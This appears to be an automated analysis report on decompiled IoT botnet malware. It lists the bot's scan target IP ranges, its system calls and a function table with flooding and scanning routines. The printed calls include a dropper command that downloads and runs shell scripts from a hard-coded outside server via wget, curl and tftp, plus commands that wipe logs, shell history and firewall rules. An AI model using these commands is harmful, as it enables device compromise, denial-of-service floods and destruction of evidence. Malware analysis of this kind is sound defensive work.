        szprintf(v187, (int32_t)"163.53.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v188, (int32_t)"43.230.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v189, (int32_t)"62.252.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v190, (int32_t)"43.245.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v191, (int32_t)"62.255.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v192, (int32_t)"123.25.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v193, (int32_t)"103.54.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v194, (int32_t)"27.255.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v195, (int32_t)"103.204.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v196, (int32_t)"123.24.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v197, (int32_t)"113.191.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v198, (int32_t)"81.100.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v199, (int32_t)"113.188.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v200, (int32_t)"113.189.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v201, (int32_t)"94.174.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v202, (int32_t)"14.160.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v203, (int32_t)"14.161.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v204, (int32_t)"14.162.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v205, (int32_t)"14.163.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v206, (int32_t)"14.164.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v207, (int32_t)"14.165.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v208, (int32_t)"14.166.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v209, (int32_t)"14.167.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v210, (int32_t)"14.168.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v211, (int32_t)"14.169.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v212, (int32_t)"14.170.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v213, (int32_t)"14.171.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v214, (int32_t)"14.172.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v215, (int32_t)"14.173.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v216, (int32_t)"14.174.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v217, (int32_t)"14.175.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v218, (int32_t)"14.176.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v219, (int32_t)"14.177.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v220, (int32_t)"14.178.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v221, (int32_t)"14.179.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v222, (int32_t)"14.180.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v223, (int32_t)"14.181.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v224, (int32_t)"14.182.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v225, (int32_t)"14.183.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v226, (int32_t)"14.184.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v227, (int32_t)"14.185.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v228, (int32_t)"14.186.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v229, (int32_t)"14.187.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v230, (int32_t)"14.188.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v231, (int32_t)"14.189.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v232, (int32_t)"14.190.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v233, (int32_t)"14.191.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v234, (int32_t)"45.121.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v235, (int32_t)"45.120.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v236, (int32_t)"45.115.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v237, (int32_t)"43.252.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v238, (int32_t)"43.230.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v239, (int32_t)"43.240.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v240, (int32_t)"43.245.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v241, (int32_t)"41.174.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v242, (int32_t)"49.118.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v243, (int32_t)"78.188.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v244, (int32_t)"45.127.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v245, (int32_t)"103.30.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v246, (int32_t)"14.33.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v247, (int32_t)"123.16.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v248, (int32_t)"202.44.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v249, (int32_t)"116.93.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v250, (int32_t)"91.83.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v251, (int32_t)"41.253.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v252, (int32_t)"117.173.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v253, (int32_t)"113.190.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v254, (int32_t)"146.88.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v255, (int32_t)"112.196.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v256, (int32_t)"113.178.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v257, (int32_t)"112.45.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v258, (int32_t)"183.223.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v259, (int32_t)"116.71.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v260, (int32_t)"103.44.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v261, (int32_t)"110.235.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v262, (int32_t)"124.253.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v263, (int32_t)"211.237.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v264, (int32_t)"117.175.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v265, (int32_t)"117.173.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v266, (int32_t)"178.93.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v267, (int32_t)"111.9.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v268, (int32_t)"222.252.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v269, (int32_t)"113.174.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v270, (int32_t)"222.252.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v271, (int32_t)"113.160.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v272, (int32_t)"113.161.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v273, (int32_t)"113.162.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v274, (int32_t)"113.163.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v275, (int32_t)"113.164.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v276, (int32_t)"113.165.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v277, (int32_t)"113.166.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v278, (int32_t)"113.167.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v279, (int32_t)"113.168.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v280, (int32_t)"113.169.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v281, (int32_t)"123.17.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v282, (int32_t)"123.18.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v283, (int32_t)"123.19.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v284, (int32_t)"123.20.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v285, (int32_t)"123.21.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v286, (int32_t)"123.22.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v287, (int32_t)"222.252.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v288, (int32_t)"222.253.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v289, (int32_t)"222.254.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v290, (int32_t)"222.255.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v291, (int32_t)"37.247.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v292, (int32_t)"41.208.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v293, (int32_t)"183.220.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v294, (int32_t)"175.201.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v295, (int32_t)"103.198.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v296, (int32_t)"183.223.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v297, (int32_t)"50.205.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v298, (int32_t)"88.248.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v299, (int32_t)"88.105.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v300, (int32_t)"88.247.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v301, (int32_t)"85.105.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v302, (int32_t)"188.3.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v303, (int32_t)"103.203.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v304, (int32_t)"103.55.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v305, (int32_t)"103.220.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v306, (int32_t)"183.233.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v307, (int32_t)"103.242.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v308, (int32_t)"103.198.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v309, (int32_t)"103.14.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v310, (int32_t)"103.195.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v311, (int32_t)"103.203.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v312, (int32_t)"103.214.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v313, (int32_t)"103.218.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v314, (int32_t)"103.225.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v315, (int32_t)"103.228.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v316, (int32_t)"103.231.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v317, (int32_t)"103.60.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v318, (int32_t)"103.248.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v319, (int32_t)"103.253.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v320, (int32_t)"103.255.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v321, (int32_t)"103.35.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v322, (int32_t)"103.49.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v323, (int32_t)"103.62.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v324, (int32_t)"144.48.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v325, (int32_t)"163.47.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v326, (int32_t)"163.53.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v327, (int32_t)"223.29.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v328, (int32_t)"59.153.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v329, (int32_t)"113.176.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v330, (int32_t)"113.175.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v331, (int32_t)"113.177.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v332, (int32_t)"113.183.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v333, (int32_t)"202.164.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v334, (int32_t)"203.134.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v335, (int32_t)"210.56.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v336, (int32_t)"49.156.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v337, (int32_t)"203.210.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v338, (int32_t)"117.181.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v339, (int32_t)"117.178.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v340, (int32_t)"117.177.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v341, (int32_t)"117.176.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v342, (int32_t)"117.170.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v343, (int32_t)"117.171.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v344, (int32_t)"117.162.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v344, (int32_t)"112.26.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v345, (int32_t)"112.27.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v346, (int32_t)"112.28.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v347, (int32_t)"112.29.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v348, (int32_t)"112.30.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v349, (int32_t)"112.31.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v350, (int32_t)"203.150.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v352, (int32_t)"50.233.%d.%d", (int32_t)v131, (int32_t)v132);

    szprintf(v139, (int32_t)"%d.%d.%d.%d", (int32_t)v140, (int32_t)v129);

        sprintf(v136, (int32_t)"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00");

    return __libc_system((int32_t)"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n");

        inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
    return __libc_system((int32_t)"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n");

        __libc_system(v138);

        result = __libc_system(v145);

    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");

    __libc_system((int32_t)"rm -rf /var/log/wtmp");

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"rm -rf /var/log/wtmp");

    __libc_system((int32_t)"rm -rf /tmp/*");

    __libc_system((int32_t)"history -c");

    __libc_system((int32_t)"rm -rf ~/.bash_history");

    __libc_system((int32_t)"rm -rf /bin/netstat");

    __libc_system((int32_t)"history -w");

    __libc_system((int32_t)"pkill -9 busybox");

    __libc_system((int32_t)"pkill -9 perl");

    __libc_system((int32_t)"service iptables stop");

    return __libc_system((int32_t)"/sbin/iptables -F;/sbin/iptables -X");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |0   |10409   |968           |1736        |
----------------------------------------------------------------------------------------------
HackerScan2                                       |1   |1407    |215           |0           |
----------------------------------------------------------------------------------------------
sysconf                                           |1   |915     |136           |0           |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |1176    |73            |864         |
----------------------------------------------------------------------------------------------
main                                              |0   |642     |56            |421         |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |0   |3456    |47            |3231        |
----------------------------------------------------------------------------------------------
fdpopen                                           |0   |464     |38            |0           |
----------------------------------------------------------------------------------------------
_init                                             |0   |317     |33            |0           |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |8   |557     |33            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |457     |32            |179         |
----------------------------------------------------------------------------------------------
malloc                                            |1   |3693    |30            |2310        |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |1   |724     |30            |573         |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |9   |626     |28            |243         |
----------------------------------------------------------------------------------------------
prints                                            |4   |482     |28            |28          |
----------------------------------------------------------------------------------------------
sendUDP                                           |6   |328     |26            |66          |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |527     |23            |326         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |1079    |20            |921         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |260     |17            |80          |
----------------------------------------------------------------------------------------------
sendJUNK                                          |3   |308     |13            |141         |
----------------------------------------------------------------------------------------------
RemoveTMP                                         |0   |147     |13            |0           |
----------------------------------------------------------------------------------------------
sendHOLD                                          |3   |285     |11            |122         |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |4   |1022    |11            |0           |
----------------------------------------------------------------------------------------------
print                                             |3   |443     |10            |288         |
----------------------------------------------------------------------------------------------
getBogos                                          |1   |204     |10            |58          |
----------------------------------------------------------------------------------------------
getCores                                          |0   |156     |9             |0           |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |8   |712     |9             |19          |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |186     |8             |38          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |511     |8             |348         |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |175     |7             |26          |
----------------------------------------------------------------------------------------------
negotiate                                         |3   |189     |7             |0           |
----------------------------------------------------------------------------------------------
sendCNC                                           |3   |158     |7             |0           |
----------------------------------------------------------------------------------------------
fdpclose                                          |0   |189     |6             |24          |
----------------------------------------------------------------------------------------------
sleep                                             |1   |235     |6             |94          |
----------------------------------------------------------------------------------------------
memrchr                                           |3   |311     |6             |124         |
----------------------------------------------------------------------------------------------
NetisRanges                                       |1   |145     |6             |0           |
----------------------------------------------------------------------------------------------
recvLine                                          |0   |256     |6             |83          |
----------------------------------------------------------------------------------------------
StartTheNetis                                     |0   |149     |5             |9           |
----------------------------------------------------------------------------------------------
printi                                            |1   |235     |5             |23          |
----------------------------------------------------------------------------------------------
inet_pton                                         |4   |434     |5             |253         |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |214     |5             |35          |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |4   |532     |4             |91          |
----------------------------------------------------------------------------------------------
strstr                                            |2   |271     |4             |119         |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |165     |4             |0           |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |231     |4             |88          |
----------------------------------------------------------------------------------------------
abort                                             |0   |212     |4             |75          |
----------------------------------------------------------------------------------------------
botkiller                                         |0   |165     |4             |0           |
----------------------------------------------------------------------------------------------
HackerPrint                                       |2   |143     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |190     |3             |0           |
----------------------------------------------------------------------------------------------
hostname_to_ip                                    |2   |155     |3             |0           |
----------------------------------------------------------------------------------------------
listFork                                          |0   |165     |3             |17          |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |192     |3             |0           |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |1   |240     |3             |59          |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |168     |3             |0           |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |149     |2             |0           |
----------------------------------------------------------------------------------------------
trim                                              |0   |196     |2             |56          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |173     |2             |0           |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |4   |229     |2             |71          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |0   |186     |2             |31          |
----------------------------------------------------------------------------------------------
inet_aton                                         |2   |240     |2             |94          |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |204     |2             |37          |
----------------------------------------------------------------------------------------------
__GI_vfprintf                                     |4   |186     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |4   |197     |2             |49          |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |235     |2             |34          |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |4   |815     |2             |661         |
----------------------------------------------------------------------------------------------
__GI_herror                                       |1   |170     |2             |0           |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |181     |2             |0           |
----------------------------------------------------------------------------------------------
__malloc_consolidate                              |1   |281     |2             |122         |
----------------------------------------------------------------------------------------------
rawmemchr                                         |4   |228     |2             |25          |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |4   |213     |2             |60          |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |4   |172     |2             |0           |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |4   |215     |2             |74          |
----------------------------------------------------------------------------------------------
strcasestr                                        |2   |206     |2             |61          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |145     |2             |0           |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |192     |2             |52          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |4   |190     |2             |45          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |168     |2             |16          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |7   |211     |1             |47          |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |162     |1             |18          |
----------------------------------------------------------------------------------------------
__GI_snprintf                                     |6   |136     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |4   |161     |1             |20          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |135     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |0   |166     |1             |21          |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |134     |1             |0           |
----------------------------------------------------------------------------------------------
strnlen                                           |0   |164     |1             |18          |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |164     |1             |18          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |148     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |2   |176     |1             |22          |
----------------------------------------------------------------------------------------------
sprintf                                           |2   |136     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |0   |139     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |0   |171     |1             |18          |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |135     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |4   |136     |1             |0           |
----------------------------------------------------------------------------------------------
__raise                                           |1   |135     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |147     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |136     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |0   |136     |1             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |1   |136     |1             |0           |
----------------------------------------------------------------------------------------------
getdtablesize                                     |1   |142     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |4   |165     |1             |28          |
----------------------------------------------------------------------------------------------
_fini                                             |0   |137     |1             |0           |
----------------------------------------------------------------------------------------------
kill                                              |2   |147     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |1   |311     |1             |80          |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |134     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |3   |214     |1             |56          |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |0   |140     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |135     |1             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |182     |1             |27          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |156     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |135     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |134     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |160     |1             |19          |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |135     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |2   |194     |1             |35          |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |4   |161     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |146     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |3   |134     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |135     |1             |0           |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |177     |1             |28          |
----------------------------------------------------------------------------------------------
socket                                            |3   |134     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |213     |1             |34          |
----------------------------------------------------------------------------------------------
HackerScan                                        |1   |136     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |136     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |134     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |142     |1             |0           |
----------------------------------------------------------------------------------------------
fprintf                                           |5   |137     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |5   |234     |1             |39          |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |0   |149     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |2   |135     |1             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |4   |149     |1             |0           |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |142     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_clock_getres                                 |5   |146     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |151     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |1   |147     |1             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |263     |1             |22          |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |138     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |134     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |2   |159     |1             |17          |
----------------------------------------------------------------------------------------------
srand                                             |1   |140     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |143     |1             |0           |
----------------------------------------------------------------------------------------------
LoopPayload                                       |0   |135     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |134     |1             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |4   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |135     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |161     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |3   |146     |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |148     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |1   |135     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |4   |135     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |4   |142     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |0   |164     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |0   |157     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |0   |138     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |166     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |141     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |0   |147     |0             |0           |
